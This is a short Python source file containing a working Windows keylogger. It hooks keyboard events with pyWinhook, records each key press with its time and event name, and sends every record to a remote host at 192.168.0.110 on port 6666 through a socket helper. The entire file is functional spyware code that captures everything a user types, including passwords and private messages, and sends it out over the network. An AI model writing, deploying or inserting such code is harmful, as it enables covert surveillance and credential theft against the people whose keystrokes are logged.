import pythoncom, pyWinhook, time
from socket_client_pickle import client_pic


def OnkeyBoardEvent(event):
    dict_key = {}
    dict_key['MessageName:'] = event.MessageName
    # dict_key['Message:'] = event.Message
    dict_key['Time:'] = time.ctime(time.time())
    # dict_key['Window:'] = event.Time
    dict_key['Key'] = event.Key

    client_pic('192.168.0.110', 6666, dict_key)
    return


def keylogger():
    hm = pyWinhook.HookManager()
    hm.KeyDown = OnkeyBoardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == "__main__":
    keylogger()
